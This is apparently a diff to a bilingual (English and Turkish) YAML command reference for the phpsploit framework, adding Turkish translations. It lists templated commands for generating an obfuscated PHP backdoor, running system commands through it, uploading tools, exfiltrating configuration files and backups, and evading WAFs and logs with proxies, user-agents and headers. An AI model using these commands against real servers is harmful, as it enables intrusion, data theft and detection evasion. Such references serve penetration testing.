@@ -3,89 +3,149 @@ tags: [web, post-exploitation, php, shell, security, pentest, stealth, backdoor]
 
 actions:
   # === INITIALIZATION & SETUP ===
-  - title: phpsploit - generate stealth backdoor
-    desc: |
-      Generates the obfuscated PHP backdoor code that needs to be uploaded to the target server.
-      This script acts as the server-side component of the framework, enabling stealthy communication via HTTP headers.
-      You can specify the output path to save the generated code directly to a file for later deployment.
+  - title:
+      en: phpsploit - generate stealth backdoor
+      tr: phpsploit - gizli arka kapı üretme
+    desc:
+      en: |
+        Generates the obfuscated PHP backdoor code that needs to be uploaded to the target server.
+        This script acts as the server-side component of the framework, enabling stealthy communication via HTTP headers.
+        You can specify the output path to save the generated code directly to a file for later deployment.
+      tr: |
+        Hedef sunucuya yüklenmesi gereken gizlenmiş PHP arka kapı kodunu üretir. Bu betik, çatının (framework) sunucu tarafı bileşeni olarak HTTP başlıkları üzerinden gizli iletişimi sağlar. Üretilen kodu daha sonra dağıtmak üzere doğrudan bir dosyaya kaydetmek için çıktı yolunu belirtebilirsiniz.
     command: "phpsploit -e \"backdoor --output {{output_path|backdoor.php}}\""
 
-  - title: phpsploit - display backdoor code
-    desc: |
-      Displays the PHP backdoor code directly in the terminal without saving it to a file.
-      This is useful if you want to manually copy-paste the code into an existing file on the target or a web-based file manager.
-      The generated code is highly obfuscated to bypass simple pattern-matching security solutions.
+  - title:
+      en: phpsploit - display backdoor code
+      tr: phpsploit - arka kapı kodunu görüntüleme
+    desc:
+      en: |
+        Displays the PHP backdoor code directly in the terminal without saving it to a file.
+        This is useful if you want to manually copy-paste the code into an existing file on the target or a web-based file manager.
+        The generated code is highly obfuscated to bypass simple pattern-matching security solutions.
+      tr: |
+        PHP arka kapı kodunu bir dosyaya kaydetmeden doğrudan terminalde görüntüler. Kodu hedefteki mevcut bir dosyaya veya web tabanlı bir dosya yöneticisine elle kopyalayıp yapıştırmak istiyorsanız kullanışlıdır. Üretilen kod, basit kalıp eşleşmeli güvenlik çözümlerini atlatmak için yoğun şekilde gizlenmiştir.
     command: "phpsploit -e \"backdoor\""
 
   # === CONNECTION & SESSIONS ===
-  - title: phpsploit - connect to target
-    desc: |
-      Establishes an interactive connection to the pre-deployed PHP backdoor on the remote server.
-      This command initiates the handshake process and opens a command-line interface for further exploitation.
-      Make sure the URL provided is the exact path where the phpsploit backdoor is hosted.
+  - title:
+      en: phpsploit - connect to target
+      tr: phpsploit - hedefe bağlanma
+    desc:
+      en: |
+        Establishes an interactive connection to the pre-deployed PHP backdoor on the remote server.
+        This command initiates the handshake process and opens a command-line interface for further exploitation.
+        Make sure the URL provided is the exact path where the phpsploit backdoor is hosted.
+      tr: |
+        Uzak sunucudaki önceden yerleştirilmiş PHP arka kapıya etkileşimli bir bağlantı kurar. Bu komut el sıkışma işlemini başlatır ve ileri sömürü için bir komut satırı arayüzü açar. Verilen URL'nin phpsploit arka kapısının barındırıldığı tam yol olduğundan emin olun.
     command: "phpsploit --target {{url}}"
 
-  - title: phpsploit - load session
-    desc: |
-      Resumes a previously saved session from a local file.
-      This allows you to maintain persistence across different work sessions without losing configuration or target history.
-      Sessions contain information about the target URL, environment variables, and custom settings used during the last interaction.
+  - title:
+      en: phpsploit - load session
+      tr: phpsploit - oturum yükleme
+    desc:
+      en: |
+        Resumes a previously saved session from a local file.
+        This allows you to maintain persistence across different work sessions without losing configuration or target history.
+        Sessions contain information about the target URL, environment variables, and custom settings used during the last interaction.
+      tr: |
+        Yerel bir dosyadan önceden kaydedilmiş bir oturumu sürdürür. Bu, yapılandırma veya hedef geçmişini kaybetmeden farklı çalışma oturumları arasında kalıcılığı korumanıza olanak tanır. Oturumlar; hedef URL, ortam değişkenleri ve son etkileşimde kullanılan özel ayarlar hakkında bilgi içerir.
     command: "phpsploit --load {{session_file}}"
 
-  - title: phpsploit - run commands from file
-    desc: |
-      Executes a series of phpsploit commands stored in a local text file against the target.
-      This is ideal for automating repetitive tasks such as initial environment enumeration or automated cleanup.
-      The interactive mode is disabled by default when using this flag unless forced otherwise.
+  - title:
+      en: phpsploit - run commands from file
+      tr: phpsploit - komutları dosyadan çalıştırma
+    desc:
+      en: |
+        Executes a series of phpsploit commands stored in a local text file against the target.
+        This is ideal for automating repetitive tasks such as initial environment enumeration or automated cleanup.
+        The interactive mode is disabled by default when using this flag unless forced otherwise.
+      tr: |
+        Yerel bir metin dosyasında saklanan bir dizi phpsploit komutunu hedefe karşı çalıştırır. İlk ortam numaralandırma veya otomatik temizlik gibi tekrarlayan görevleri otomatikleştirmek için idealdir. Aksi zorlanmadıkça bu bayrak kullanılırken etkileşimli mod varsayılan olarak kapalıdır.
     command: "phpsploit --target {{url}} --source {{script_file}}"
 
   # === POST-EXPLOITATION ACTIONS ===
-  - title: phpsploit - system command execution
-    desc: |
-      Executes a native operating system command on the remote server through the PHP backdoor.
-      The results are returned through the obfuscated channel, minimizing the footprint in web server access logs.
-      Always check the current user's privileges before attempting sensitive commands to avoid unnecessary detection.
+  - title:
+      en: phpsploit - system command execution
+      tr: phpsploit - sistem komutu çalıştırma
+    desc:
+      en: |
+        Executes a native operating system command on the remote server through the PHP backdoor.
+        The results are returned through the obfuscated channel, minimizing the footprint in web server access logs.
+        Always check the current user's privileges before attempting sensitive commands to avoid unnecessary detection.
+      tr: |
+        PHP arka kapı üzerinden uzak sunucuda yerel bir işletim sistemi komutu çalıştırır. Sonuçlar gizlenmiş kanal üzerinden döndürülür; web sunucusu erişim kayıtlarındaki iz en aza indirilir. Gereksiz tespitten kaçınmak için hassas komutları denemeden önce geçerli kullanıcının ayrıcalıklarını her zaman denetleyin.
     command: "phpsploit -e \"run {{system_command|id}}\" --target {{url}}"
 
-  - title: phpsploit - upload file
-    desc: |
-      Transfers a file from the local attacker machine to the remote compromised server.
-      This is critical for deploying privilege escalation scripts, static binaries, or other post-exploitation tools.
-      The transfer is handled via the stealthy HTTP tunnel, making it harder to detect compared to standard FTP or HTTP uploads.
+  - title:
+      en: phpsploit - upload file
+      tr: phpsploit - dosya yükleme
+    desc:
+      en: |
+        Transfers a file from the local attacker machine to the remote compromised server.
+        This is critical for deploying privilege escalation scripts, static binaries, or other post-exploitation tools.
+        The transfer is handled via the stealthy HTTP tunnel, making it harder to detect compared to standard FTP or HTTP uploads.
+      tr: |
+        Yerel saldırgan makinesinden ele geçirilmiş uzak sunucuya dosya aktarır. Yetki yükseltme betiklerini, statik çalıştırılabilir dosyaları veya diğer sömürü sonrası araçları dağıtmak için kritiktir. Aktarım gizli HTTP tüneli üzerinden yapılır; standart FTP veya HTTP yüklemelerine kıyasla tespit edilmesi daha zordur.
     command: "phpsploit -e \"upload {{local_path}} {{remote_path}}\" --target {{url}}"
 
-  - title: phpsploit - download file
-    desc: |
-      Downloads a file from the target server to your local machine for analysis or exfiltration.
-      Use this to grab configuration files, database backups, or sensitive source code from the web root.
-      The tool ensures that the file content is retrieved securely through the established obfuscated medium.
+  - title:
+      en: phpsploit - download file
+      tr: phpsploit - dosya indirme
+    desc:
+      en: |
+        Downloads a file from the target server to your local machine for analysis or exfiltration.
+        Use this to grab configuration files, database backups, or sensitive source code from the web root.
+        The tool ensures that the file content is retrieved securely through the established obfuscated medium.
+      tr: |
+        Analiz veya veri sızdırma için hedef sunucudan yerel makinenize dosya indirir. Web kök dizinindeki yapılandırma dosyalarını, veritabanı yedeklerini veya hassas kaynak kodunu almak için bunu kullanın. Araç, dosya içeriğinin kurulmuş gizlenmiş ortam üzerinden güvenli şekilde alınmasını sağlar.
     command: "phpsploit -e \"download {{remote_path}} {{local_path}}\" --target {{url}}"
 
-  - title: phpsploit - gather system information
-    desc: |
-      Collects detailed information about the target's operating system, PHP environment, and hardware.
-      This helps in identifying potential local privilege escalation vulnerabilities and understanding the environment's limitations.
-      It provides data such as the OS kernel version, PHP version, and lists of disabled PHP functions.
+  - title:
+      en: phpsploit - gather system information
+      tr: phpsploit - sistem bilgisi toplama
+    desc:
+      en: |
+        Collects detailed information about the target's operating system, PHP environment, and hardware.
+        This helps in identifying potential local privilege escalation vulnerabilities and understanding the environment's limitations.
+        It provides data such as the OS kernel version, PHP version, and lists of disabled PHP functions.
+      tr: |
+        Hedefin işletim sistemi, PHP ortamı ve donanımı hakkında ayrıntılı bilgi toplar. Bu, potansiyel yerel yetki yükseltme zafiyetlerini belirlemeye ve ortamın sınırlarını anlamaya yardımcı olur. İşletim sistemi çekirdek sürümü, PHP sürümü ve devre dışı PHP işlevlerinin listesi gibi veriler sunar.
     command: "phpsploit -e \"info\" --target {{url}}"
 
   # === STEALTH & CONFIGURATION ===
-  - title: phpsploit - connection via proxy
-    desc: |
-      Routes all phpsploit traffic through a specified proxy server (SOCKS or HTTP).
-      This is essential for anonymizing your activity or bypassing network restrictions that might block direct outgoing connections.
-      Ensure the proxy is active and reachable before attempting to connect to the target.
+  - title:
+      en: phpsploit - connection via proxy
+      tr: phpsploit - proxy üzerinden bağlantı
+    desc:
+      en: |
+        Routes all phpsploit traffic through a specified proxy server (SOCKS or HTTP).
+        This is essential for anonymizing your activity or bypassing network restrictions that might block direct outgoing connections.
+        Ensure the proxy is active and reachable before attempting to connect to the target.
+      tr: |
+        Tüm phpsploit trafiğini belirtilen bir proxy sunucusu (SOCKS veya HTTP) üzerinden yönlendirir. Etkinliğinizi anonimleştirmek veya doğrudan giden bağlantıları engelleyebilecek ağ kısıtlamalarını aşmak için vazgeçilmezdir. Hedefe bağlanmayı denemeden önce proxy'nin etkin ve erişilebilir olduğundan emin olun.
     command: "phpsploit -e \"set proxy {{proxy_url|http://127.0.0.1:8080}}\" --target {{url}}"
 
-  - title: phpsploit - set custom user-agent
-    desc: |
-      Changes the User-Agent string used by phpsploit to mimic a legitimate web browser.
-      Customizing this value helps the backdoor traffic blend in with normal user activity in the web server's logs.
-      Using a common browser string is a standard practice for staying stealthy during long-term engagements.
+  - title:
+      en: phpsploit - set custom user-agent
+      tr: phpsploit - özel kullanıcı aracısı (User-Agent) ayarlama
+    desc:
+      en: |
+        Changes the User-Agent string used by phpsploit to mimic a legitimate web browser.
+        Customizing this value helps the backdoor traffic blend in with normal user activity in the web server's logs.
+        Using a common browser string is a standard practice for staying stealthy during long-term engagements.
+      tr: |
+        Meşru bir web tarayıcısını taklit etmek için phpsploit'in kullandığı User-Agent dizgisini değiştirir. Bu değeri özelleştirmek, arka kapı trafiğinin web sunucusu kayıtlarındaki normal kullanıcı etkinliğiyle kaynaşmasına yardımcı olur. Yaygın bir tarayıcı dizgisi kullanmak, uzun süreli çalışmalarda gizli kalmak için standart bir uygulamadır.
     command: "phpsploit -e \"set user-agent {{user_agent|Mozilla/5.0 (Windows NT 10.0; Win64; x64)}}\" --target {{url}}"
 
-  - title: phpsploit - set custom request header
-    desc: |
-      Adds or modifies custom HTTP headers for the communication between the client and the backdoor.
-      This can be used to bypass certain WAF rules or to match specific traffic patterns expected by the target environment.
-      Setting headers like 'X-Forwarded-For' might also be useful in specific network configurations.
+  - title:
+      en: phpsploit - set custom request header
+      tr: phpsploit - özel istek başlığı ayarlama
+    desc:
+      en: |
+        Adds or modifies custom HTTP headers for the communication between the client and the backdoor.
+        This can be used to bypass certain WAF rules or to match specific traffic patterns expected by the target environment.
+        Setting headers like 'X-Forwarded-For' might also be useful in specific network configurations.
+      tr: |
+        İstemci ile arka kapı arasındaki iletişim için özel HTTP başlıkları ekler veya değiştirir. Bu, belirli WAF kurallarını atlatmak veya hedef ortamın beklediği trafik kalıplarına uymak için kullanılabilir. 'X-Forwarded-For' gibi başlıkları ayarlamak belirli ağ yapılandırmalarında da yararlı olabilir.
     command: "phpsploit -e \"set {{header_name|X-Custom-Header}} {{header_value}}\" --target {{url}}"
